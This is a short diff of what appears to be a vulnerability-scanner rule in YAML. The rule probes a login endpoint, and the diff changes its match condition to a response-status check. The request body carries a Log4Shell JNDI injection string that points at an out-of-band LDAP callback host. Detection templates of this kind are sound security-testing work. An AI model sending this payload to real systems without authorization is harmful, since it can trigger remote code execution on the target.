@@ -15,7 +15,7 @@ rules:
       method: POST
       path: /api/login
       body: '{"username":"admin","password":"lolwat","remember":"${jndi:ldap://{{dnstest}}/tea}","strict":true}'
-    expression: "true"
+    expression: response.status >= 200
   r2:
     request:
       method: GET
